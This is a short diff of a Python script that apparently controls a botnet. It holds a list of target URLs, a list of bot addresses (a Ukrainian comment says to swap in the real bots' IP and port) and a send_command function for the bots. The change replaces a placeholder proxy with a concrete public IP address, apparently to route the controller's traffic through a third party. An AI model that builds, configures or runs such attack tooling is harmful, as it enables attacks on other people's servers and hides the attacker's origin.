@@ -12,8 +12,8 @@ target_urls = [
 ]
 bot_ips = ["bot1.local:5000", "bot2.local:5000"]  # Замініть на реальні IP:порт ботів
 proxies = {
-    "http": "http://proxy.example.com:8080",
-    "https": "https://proxy.example.com:8080"
+    "http": "http://181.65.121.34:8080",
+    "https": "https://181.65.121.34:8080"
 }
 
 def send_command(bot_ip):
